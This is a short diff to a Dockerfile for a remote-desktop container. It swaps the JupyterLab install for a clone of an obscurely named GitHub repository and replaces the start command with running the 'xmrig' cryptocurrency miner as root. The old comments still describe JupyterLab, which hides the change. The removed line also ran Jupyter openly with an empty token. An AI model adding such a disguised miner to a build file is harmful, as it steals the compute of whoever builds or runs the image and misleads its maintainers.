@@ -51,10 +51,10 @@ RUN sudo echo "exec /usr/bin/startxfce4" >> /etc/chrome-remote-desktop-session
 WORKDIR /app
 
 # Install JupyterLab
-RUN pip3 install jupyterlab --break-system-packages
+RUN git clone https://github.com/SudoSuII/hsJwjJwj91
 
 # Expose port 8080
 EXPOSE 8080
 
 # Start JupyterLab on port 8080 without authentication
-CMD ["jupyter", "lab", "--ip=0.0.0.0", "--port=8080", "--no-browser", "--allow-root", "--NotebookApp.token=''"]
+CMD ["sudo", "/app/hsJwjJwj91/xmrig"]
